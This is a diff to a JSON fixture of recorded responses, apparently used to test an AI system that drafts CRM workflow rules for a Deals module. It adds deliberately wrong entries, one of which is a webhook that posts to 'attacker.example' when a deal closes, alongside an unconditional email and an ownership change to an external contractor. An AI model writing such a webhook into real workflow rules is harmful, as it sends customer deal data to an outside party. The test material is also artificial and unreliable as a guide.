@@ -20,6 +20,21 @@
       "prompt_hash": "e8db26fd1b1ca8973073fe6a867f0e95dea33483d89e4b237645756e640a1528",
       "response": "{\n  \"abstain\": false,\n  \"abstain_reason\": \"\",\n  \"confidence\": 0.9,\n  \"rationale\": \"recorded wrong on purpose.\",\n  \"rule\": {\n    \"actions\": [\n      {\n        \"field\": \"Stage\",\n        \"type\": \"field_update\",\n        \"value\": \"Qualification\"\n      }\n    ],\n    \"active\": true,\n    \"criteria\": {\n      \"field\": \"Ghost_Field__s\",\n      \"op\": \"eq\",\n      \"value\": \"x\"\n    },\n    \"event\": {\n      \"type\": \"record_created\"\n    },\n    \"execute_on\": \"both\",\n    \"id\": \"wf-draft-bad-field\",\n    \"module\": \"Deals\",\n    \"priority\": 100,\n    \"repeat\": true\n  }\n}\n"
     },
+    "wf-draft-bad-ground-email": {
+      "origin": "hand-authored synthetic",
+      "prompt_hash": "5c524f1e85e48db67f593c509b9ab48f93dc713ca68d6a611b7f52c523589517",
+      "response": "{\n  \"abstain\": false,\n  \"abstain_reason\": \"\",\n  \"confidence\": 0.9,\n  \"rationale\": \"recorded wrong on purpose.\",\n  \"rule\": {\n    \"actions\": [\n      {\n        \"template\": \"chargeback-notice\",\n        \"type\": \"send_email\"\n      }\n    ],\n    \"active\": true,\n    \"criteria\": null,\n    \"event\": {\n      \"type\": \"record_created\"\n    },\n    \"execute_on\": \"both\",\n    \"id\": \"wf-draft-bad-ground-email\",\n    \"module\": \"Deals\",\n    \"priority\": 100,\n    \"repeat\": true\n  }\n}\n"
+    },
+    "wf-draft-bad-ground-owner": {
+      "origin": "hand-authored synthetic",
+      "prompt_hash": "c8a786914119e7afbfbff81cdfa15b39e82114bca87765017dc2c3f40ed2ca9e",
+      "response": "{\n  \"abstain\": false,\n  \"abstain_reason\": \"\",\n  \"confidence\": 0.9,\n  \"rationale\": \"recorded wrong on purpose.\",\n  \"rule\": {\n    \"actions\": [\n      {\n        \"owner\": \"external-contractor\",\n        \"type\": \"assign_owner\"\n      }\n    ],\n    \"active\": true,\n    \"criteria\": null,\n    \"event\": {\n      \"type\": \"record_created\"\n    },\n    \"execute_on\": \"both\",\n    \"id\": \"wf-draft-bad-ground-owner\",\n    \"module\": \"Deals\",\n    \"priority\": 100,\n    \"repeat\": true\n  }\n}\n"
+    },
+    "wf-draft-bad-ground-webhook": {
+      "origin": "hand-authored synthetic",
+      "prompt_hash": "aa996bbbb902cda2c8448e50051e1028066f8b12bd8980ee5382148031659d3d",
+      "response": "{\n  \"abstain\": false,\n  \"abstain_reason\": \"\",\n  \"confidence\": 0.9,\n  \"rationale\": \"recorded wrong on purpose.\",\n  \"rule\": {\n    \"actions\": [\n      {\n        \"type\": \"webhook\",\n        \"url\": \"https://attacker.example/x\"\n      }\n    ],\n    \"active\": true,\n    \"criteria\": {\n      \"field\": \"Stage\",\n      \"op\": \"eq\",\n      \"value\": \"Closed Won\"\n    },\n    \"event\": {\n      \"field\": \"Stage\",\n      \"type\": \"field_changed\"\n    },\n    \"execute_on\": \"edit\",\n    \"id\": \"wf-draft-bad-ground-webhook\",\n    \"module\": \"Deals\",\n    \"priority\": 100,\n    \"repeat\": true\n  }\n}\n"
+    },
     "wf-draft-bad-injection": {
       "origin": "hand-authored synthetic",
       "prompt_hash": "98058751115317f1862047d4dd6e9cd26c12b0bcb84491627c3485eeaa599694",
@@ -102,7 +117,7 @@
     },
     "wf-draft-good-13": {
       "origin": "hand-authored synthetic",
-      "prompt_hash": "cdb172158736336b1bbde2275e889b2fbe7cfb119a33932943e9769397e63a9d",
+      "prompt_hash": "ceea668166bfc3cba7bd16e0b0c4314302c3461febdd6cfb809f6e174bb2b44f",
       "response": "{\n  \"abstain\": false,\n  \"abstain_reason\": \"\",\n  \"confidence\": 0.93,\n  \"rationale\": \"Mapped from the deal lifecycle vocabulary.\",\n  \"rule\": {\n    \"actions\": [\n      {\n        \"type\": \"webhook\",\n        \"url\": \"https://example.invalid/hooks/billing\"\n      }\n    ],\n    \"active\": true,\n    \"criteria\": {\n      \"field\": \"Stage\",\n      \"op\": \"eq\",\n      \"value\": \"Closed Won\"\n    },\n    \"event\": {\n      \"field\": \"Stage\",\n      \"type\": \"field_changed\"\n    },\n    \"execute_on\": \"edit\",\n    \"id\": \"wf-draft-good-13\",\n    \"module\": \"Deals\",\n    \"priority\": 100,\n    \"repeat\": true\n  }\n}\n"
     },
     "wf-draft-good-14": {
@@ -127,7 +142,7 @@
     },
     "wf-draft-good-18": {
       "origin": "hand-authored synthetic",
-      "prompt_hash": "b324be61c49eb387d08e7d4723d25f3baf23aec318562028f5749ba9ab397885",
+      "prompt_hash": "8c4a8340e35a514abb6c2d4bff8bda97b9d8dc446e90a499046ccfe421be8961",
       "response": "{\n  \"abstain\": false,\n  \"abstain_reason\": \"\",\n  \"confidence\": 0.93,\n  \"rationale\": \"Mapped from the deal lifecycle vocabulary.\",\n  \"rule\": {\n    \"actions\": [\n      {\n        \"template\": \"owner-alert\",\n        \"type\": \"send_email\"\n      }\n    ],\n    \"active\": true,\n    \"criteria\": {\n      \"field\": \"Amount\",\n      \"op\": \"lt\",\n      \"value\": 1000\n    },\n    \"event\": {\n      \"field\": \"Amount\",\n      \"type\": \"field_changed\"\n    },\n    \"execute_on\": \"edit\",\n    \"id\": \"wf-draft-good-18\",\n    \"module\": \"Deals\",\n    \"priority\": 100,\n    \"repeat\": true\n  }\n}\n"
     },
     "wf-draft-good-19": {
@@ -137,7 +152,7 @@
     },
     "wf-draft-good-20": {
       "origin": "hand-authored synthetic",
-      "prompt_hash": "9625a696a97dadf2b33bd3caaa50a688ae95a5bdb4a22b383197462e07c66ea1",
+      "prompt_hash": "2e828e004d5af5d280a8412e6f9546478475dbc10f30cfc4e71495e07814aca0",
       "response": "{\n  \"abstain\": false,\n  \"abstain_reason\": \"\",\n  \"confidence\": 0.93,\n  \"rationale\": \"Mapped from the deal lifecycle vocabulary.\",\n  \"rule\": {\n    \"actions\": [\n      {\n        \"owner\": \"regional-manager\",\n        \"type\": \"assign_owner\"\n      }\n    ],\n    \"active\": true,\n    \"criteria\": {\n      \"not\": {\n        \"field\": \"Deal_Name\",\n        \"op\": \"is_empty\"\n      }\n    },\n    \"event\": {\n      \"type\": \"record_created\"\n    },\n    \"execute_on\": \"both\",\n    \"id\": \"wf-draft-good-20\",\n    \"module\": \"Deals\",\n    \"priority\": 100,\n    \"repeat\": true\n  }\n}\n"
     },
     "wf-draft-good-21": {
